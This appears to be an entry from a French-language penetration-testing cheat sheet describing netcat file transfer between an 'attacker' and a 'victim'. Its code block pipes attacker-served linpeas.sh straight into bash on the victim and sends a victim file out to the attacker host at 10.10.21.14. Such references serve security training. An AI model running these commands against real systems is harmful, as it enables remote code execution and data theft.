---
description: |
  La commande Netcat (nc) est un utilitaire de ligne de commande permettant de lire et d'écrire des données entre deux réseaux informatiques. Elle peut être utilisée pour transférer des fichiers entre la victime et l'attaquant.

  Command Reference:

  	File to copy: linpeas.sh

  	Port: 9001

  	IP address: 10.10.21.14

command: |
  nc -lvnp 9001 < linpeas.sh

code: |
  Copy from attacker to victim:  
  nc -lvnp 9001 < linpeas.sh (attacker) 
    
  nc 10.10.21.14 9001 | bash (victim)

  Copy from victim to attacker: 
  nc 10.10.21.14 9001 < file.txt (victim)
    
  nc -lvnp 9001 > file.txt (attacker)

items:
  - Shell
services:

OS:
  - Windows
  - Linux
  - Approved-tool
attack_types:
  - General
references:
  - https://medium.com/iostrap/how-to-transfer-files-between-servers-using-netcat-d8bc13eebea
  - https://linux.die.net/man/1/nc
---
